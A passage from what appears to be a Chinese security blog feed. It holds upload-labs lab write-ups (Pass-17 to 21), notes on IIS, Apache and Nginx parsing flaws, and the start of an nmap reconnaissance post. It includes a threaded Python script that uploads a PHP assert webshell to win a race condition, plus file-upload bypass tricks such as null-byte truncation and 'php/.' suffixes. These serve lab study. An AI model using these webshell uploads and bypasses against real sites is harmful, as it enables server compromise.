class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源码得知：无论是什么文件先上传了再说，然后通过白名单检测后缀名，符合就<code>rename</code>改名，不符合就<code>unlink</code>删除文件。</p><p>使用命令<code>pip install hackhttp</code>安装<a href="https://link.zhihu.com/?target=https://github.com/BugScanTeam/hackhttp">havkhttp</a>模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Build By LandGrey</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">lists</span>):</span></span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = <span class="string">&quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://127.0.0.1/upload-labs/Pass-17/index.php</span></span><br><span class="line"><span class="string">Cookie: pass=17</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Length: 341</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;?php assert($_POST[&quot;LandGrey&quot;])?&gt;</span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">上传</span></span><br><span class="line"><span class="string">-----------------------------6696274297634--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    code, head, html, redirect, log = hh.http(<span class="string">&#x27;http://127.0.0.1/upload-labs/Pass-17/index.php&#x27;</span>, raw=raw)</span><br><span class="line">    print(str(code) + <span class="string">&quot;\r&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">pool = ThreadPool(<span class="number">10</span>)</span><br><span class="line">pool.map(upload, range(<span class="number">10000</span>))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure><p>在脚本运行的时候，访问Webshell</p><h2 id="Pass-19（条件竞争）"><a href="#Pass-19（条件竞争）" class="headerlink" title="Pass-19（条件竞争）"></a>Pass-19（条件竞争）</h2><p>和Pass-18一样，也是一个条件竞争的问题，查看源代码。对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名等。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现<strong>来不及</strong>rename的问题，从而上传成功</p><p><code>index.php</code>调用了<code>MyUpload</code>这关上传类，使用了<code>upload</code>方法，执行的顺序是先上传然后再改名，但如何快速的多线程上传那就会出现bug。</p><p>绕过方法和上一关的一样，但是这关在上传之前用了白名单来检测，所以只能上传图片马，用Apache解析漏洞或者是文件包含漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> $dir </span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line"></span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-20（代码审计）"><a href="#Pass-20（代码审计）" class="headerlink" title="Pass-20（代码审计）"></a>Pass-20（代码审计）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p><code>move_uploaded_file()</code>函数中的<code>img_path</code>是由post参数<code>save_name</code>控制的，因此可以在<code>save_name</code>利用00截断绕过。</p><p>另外**<code>move_uploaded_file</code>**会忽略掉文件末尾的 <code>/.</code><br>所以可以构造 <code>cmd.php/.</code> 来绕过</p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/20190805121815.png" alt="img"></p><h2 id="Pass-21（代码审计）"><a href="#Pass-21（代码审计）" class="headerlink" title="Pass-21（代码审计）"></a>Pass-21（代码审计）</h2><p>这个题目用了数组+/.的方式去绕过，因为源代码里面含有这样的两句代码，成了关键得绕过的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (!is_array($file)) &#123;</span><br><span class="line">                    $file &#x3D; explode(&#39;.&#39;, strtolower($file));</span><br><span class="line">                &#125;</span><br><span class="line">$file_name &#x3D; reset($file) . &#39;.&#39; . $file[count($file) - 1];</span><br></pre></td></tr></table></figure><p>这同样我们就需要满足两个条件，第一个是先得保证另外修改的名字需要满足是数组的条件，所以我们可以抓包构造数组，<br>第二点由于后面filename构成的过程中由于<code>$file[count($file) - 1]</code>的作用，导致<code>$file[1] = NULL</code>，所以构造文件名后相当于直接就是<code>xx.php/.</code>，<br>根据上面一题的知识，可以直接在<code>move_uploaded_file</code>函数的作用下可以将/.忽略，因此还是可以上传成功的。<br>因此<code>save_name</code>变量的两个值分别是<code>xx.php/</code>，另外一个值是<code>jpg</code>，其实从代码审计的角度上看，还是可控变量导致这样的后果</p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/20190805123452.png" alt="img"></p><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><p>IIS 6.0解析利用方法有<strong>三种</strong>：<br>1.目录解析<br>建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析<br>2.文件解析<br>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)<br>3.默认解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;xxx.asa</span><br><span class="line">&#x2F;xxx.cer</span><br><span class="line">&#x2F;xxx.cdx</span><br><span class="line">&#x2F;xxx.apsx</span><br></pre></td></tr></table></figure><h2 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h2><p>在正常图片URL后添加 /.php，可以解析为php</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全</p><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p><p>apache 2.1.x的版本就可以用test.php.jpg直接就可以getshell了</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx &lt;8.03畸形解析漏洞<br>直接在正常图片URL后添加/.php<br>Nginx &lt;=0.8.37<br>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p><p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透之信息收集</title>
      <link href="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h1><a id="more"></a><p><code>1 端口扫瞄</code></p><p><code>nmap -p 1-65535 -T4 -A -v www.pikachu.com</code></p><p>-p:端口</p><p>-T4：<img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200726194709357.png" alt="image-20200726194709357"></p><p>-A:<img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200726194805054.png" alt="image-20200726194805054"></p><p>-v：显示更多的细节</p><p>端口对应服务，而服务是有漏洞的</p><p>结果如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-07-26 19:42 CST</span></span><br><span class="line">NSE: Loaded <span class="number">151</span> scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at <span class="number">19</span>:<span class="number">42</span></span><br><span class="line">Completed NSE at <span class="number">19</span>:<span class="number">42</span>, <span class="number">0.00</span>s elapsed</span><br><span class="line">Initiating NSE at <span class="number">19</span>:<span class="number">42</span></span><br><span class="line">Completed NSE at <span class="number">19</span>:<span class="number">42</span>, <span class="number">0.00</span>s elapsed</span><br><span class="line">Initiating NSE at <span class="number">19</span>:<span class="number">42</span></span><br><span class="line">Completed NSE at <span class="number">19</span>:<span class="number">42</span>, <span class="number">0.00</span>s elapsed</span><br><span class="line">Initiating Ping Scan at <span class="number">19</span>:<span class="number">42</span></span><br><span class="line">Scanning www.pikachu.com (<span class="number">192.168</span>.<span class="number">52.141</span>) [<span class="number">2</span> ports]</span><br><span class="line">Completed Ping Scan at <span class="number">19</span>:<span class="number">42</span>, <span class="number">0.00</span><span class="function">s <span class="title">elapsed</span> <span class="params">(<span class="number">1</span> total hosts)</span></span></span><br><span class="line"><span class="function">Initiating Connect Scan at 19:42</span></span><br><span class="line"><span class="function">Scanning www.pikachu.<span class="title">com</span> <span class="params">(<span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span>)</span> [65535 ports]</span></span><br><span class="line"><span class="function">Discovered open port 80/tcp on 192.168.52.141</span></span><br><span class="line"><span class="function">Discovered open port 139/tcp on 192.168.52.141</span></span><br><span class="line"><span class="function">Discovered open port 554/tcp on 192.168.52.141</span></span><br><span class="line"><span class="function">Discovered open port 3306/tcp on 192.168.52.141</span></span><br><span class="line"><span class="function">Discovered open port 445/tcp on 192.168.52.141</span></span><br><span class="line"><span class="function">Discovered open port 135/tcp on 192.168.52.141</span></span><br><span class="line"><span class="function">Discovered open port 2869/tcp on 192.168.52.141</span></span><br><span class="line"><span class="function">Connect Scan Timing: About 21.79% done</span>; ETC: <span class="number">19</span>:<span class="number">44</span> (<span class="number">0</span>:<span class="number">01</span>:<span class="number">51</span> remaining)</span><br><span class="line">Discovered open port <span class="number">10243</span>/tcp on <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">Discovered open port <span class="number">5357</span>/tcp on <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">Connect Scan Timing: About <span class="number">57.38</span>% done; ETC: <span class="number">19</span>:<span class="number">43</span> (<span class="number">0</span>:<span class="number">00</span>:<span class="number">45</span> remaining)</span><br><span class="line">Completed Connect Scan at <span class="number">19</span>:<span class="number">43</span>, <span class="number">96.65</span><span class="function">s <span class="title">elapsed</span> <span class="params">(<span class="number">65535</span> total ports)</span></span></span><br><span class="line"><span class="function">Initiating Service scan at 19:43</span></span><br><span class="line"><span class="function">Scanning 9 services on www.pikachu.<span class="title">com</span> <span class="params">(<span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span>)</span></span></span><br><span class="line"><span class="function">Completed Service scan at 19:45, 111.14s <span class="title">elapsed</span> <span class="params">(<span class="number">9</span> services on <span class="number">1</span> host)</span></span></span><br><span class="line"><span class="function">NSE: Script scanning 192.168.52.141.</span></span><br><span class="line"><span class="function">Initiating NSE at 19:45</span></span><br><span class="line"><span class="function">Completed NSE at 19:46, 74.42s elapsed</span></span><br><span class="line"><span class="function">Initiating NSE at 19:46</span></span><br><span class="line"><span class="function">Completed NSE at 19:46, 8.04s elapsed</span></span><br><span class="line"><span class="function">Initiating NSE at 19:46</span></span><br><span class="line"><span class="function">Completed NSE at 19:46, 0.00s elapsed</span></span><br><span class="line"><span class="function">Nmap scan report <span class="keyword">for</span> www.pikachu.<span class="title">com</span> <span class="params">(<span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span>)</span></span></span><br><span class="line"><span class="function">Host is <span class="title">up</span> <span class="params">(<span class="number">0.0081</span>s latency)</span>.</span></span><br><span class="line"><span class="function">Not shown: 65526 filtered ports</span></span><br><span class="line"><span class="function">PORT      STATE SERVICE      VERSION</span></span><br><span class="line"><span class="function">80/tcp    open  http         Apache httpd 2.4.39 <span class="params">((Win64)</span> OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)</span></span><br><span class="line"><span class="function">| http-cookie-flags: </span></span><br><span class="line"><span class="function">|   /: </span></span><br><span class="line"><span class="function">|     PHPSESSID: </span></span><br><span class="line"><span class="function">|_      httponly flag not set</span></span><br><span class="line"><span class="function">| http-methods: </span></span><br><span class="line"><span class="function">|_  Supported Methods: GET HEAD POST OPTIONS</span></span><br><span class="line"><span class="function">|_http-server-header: Apache/2.4.39 <span class="params">(Win64)</span> OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span></span><br><span class="line"><span class="function">|_http-title: Get the pikachu</span></span><br><span class="line"><span class="function">135/tcp   open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="function">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="function">445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-<span class="title">ds</span> <span class="params">(workgroup: WORKGROUP)</span></span></span><br><span class="line"><span class="function">554/tcp   open  rtsp?</span></span><br><span class="line"><span class="function">|_rtsp-methods: ERROR: Script execution <span class="title">failed</span> <span class="params">(use -d to debug)</span></span></span><br><span class="line"><span class="function">2869/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="params">(SSDP/UPnP)</span></span></span><br><span class="line"><span class="function">3306/tcp  open  mysql        MySQL 5.7.26</span></span><br><span class="line"><span class="function">| mysql-info: </span></span><br><span class="line"><span class="function">|   Protocol: 10</span></span><br><span class="line"><span class="function">|   Version: 5.7.26</span></span><br><span class="line"><span class="function">|   Thread ID: 10</span></span><br><span class="line"><span class="function">|   Capabilities flags: 63487</span></span><br><span class="line"><span class="function">|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsCompression, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsLoadDataLocal, IgnoreSigpipes, ODBCClient, InteractiveClient, ConnectWithDatabase, LongColumnFlag, LongPassword, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</span></span><br><span class="line"><span class="function">|   Status: Autocommit</span></span><br><span class="line"><span class="function">|   Salt: M\x15!:W\x04clQeZ&quot;2Y\x04\x19k&#x27;!\x16</span></span><br><span class="line"><span class="function">|_  Auth Plugin Name: mysql_native_password</span></span><br><span class="line"><span class="function">5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="params">(SSDP/UPnP)</span></span></span><br><span class="line"><span class="function">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="function">|_http-title: Service Unavailable</span></span><br><span class="line"><span class="function">10243/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="params">(SSDP/UPnP)</span></span></span><br><span class="line"><span class="function">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="function">|_http-title: Not Found</span></span><br><span class="line"><span class="function">Service Info: Host: KTTME-PC</span>; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -<span class="number">2</span>h39m56s, deviation: <span class="number">4</span>h37m07s, median: <span class="number">2</span>s</span><br><span class="line">| nbstat: NetBIOS name: KTTME-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">28</span>:<span class="number">71</span>:<span class="number">0</span>c (VMware)</span><br><span class="line">| Names:</span><br><span class="line">|   KTTME-PC&lt;<span class="number">00</span>&gt;         Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;<span class="number">00</span>&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   KTTME-PC&lt;<span class="number">20</span>&gt;         Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;<span class="number">1</span>e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;<span class="number">1d</span>&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|_  \x01\x02__MSBROWSE__\x02&lt;<span class="number">01</span>&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows <span class="number">7</span> Ultimate <span class="number">7601</span> Service Pack <span class="number">1</span> (Windows <span class="number">7</span> Ultimate <span class="number">6.1</span>)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1</span><br><span class="line">|   Computer name: kttme-PC</span><br><span class="line">|   NetBIOS computer name: KTTME-PC\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: <span class="number">2020</span>-<span class="number">07</span>-<span class="number">26</span>T19:<span class="number">45</span>:<span class="number">39</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but <span class="keyword">default</span>)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   <span class="number">2.02</span>: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: <span class="number">2020</span>-<span class="number">07</span>-<span class="number">26</span>T11:<span class="number">45</span>:<span class="number">39</span></span><br><span class="line">|_  start_date: <span class="number">2020</span>-<span class="number">07</span>-<span class="number">26</span>T06:<span class="number">22</span>:<span class="number">53</span></span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at <span class="number">19</span>:<span class="number">46</span></span><br><span class="line">Completed NSE at <span class="number">19</span>:<span class="number">46</span>, <span class="number">0.00</span>s elapsed</span><br><span class="line">Initiating NSE at <span class="number">19</span>:<span class="number">46</span></span><br><span class="line">Completed NSE at <span class="number">19</span>:<span class="number">46</span>, <span class="number">0.00</span>s elapsed</span><br><span 